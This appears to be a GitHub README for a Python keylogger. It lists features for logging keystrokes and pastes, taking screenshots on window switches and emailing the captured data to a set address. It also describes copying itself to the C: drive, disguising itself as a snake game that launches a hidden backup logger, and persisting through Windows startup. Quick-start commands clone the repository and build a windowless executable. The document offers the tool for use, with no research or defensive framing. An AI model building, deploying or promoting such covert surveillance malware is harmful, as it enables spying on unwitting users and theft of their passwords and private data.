# An advanced keylogger implemented in Python
## Features
- Record the output of the full keyboard
- Also record the content of the paste action
- Take a screenshot every time user switch between windows
- Packaged and collected information sent to a specified email address
- It will copy itself to the C: drive
- Disguised as a snake game, it will run the backup keylogger after "GAMEOVER" (Yeah, also for the user)
- Add the backup keylogger to Windows Startup, so it will run automatically at startup in Windows
## Usage
Quick start
1. `git clone https://github.com/Zeal-L/Key-paste-screen-logger`
2. `cd Key-paste-screen-logger`
3. `pip install pyinstaller`
4. `pyinstaller -F -w system.py`
5. `cd dist/ && ./system.exe `

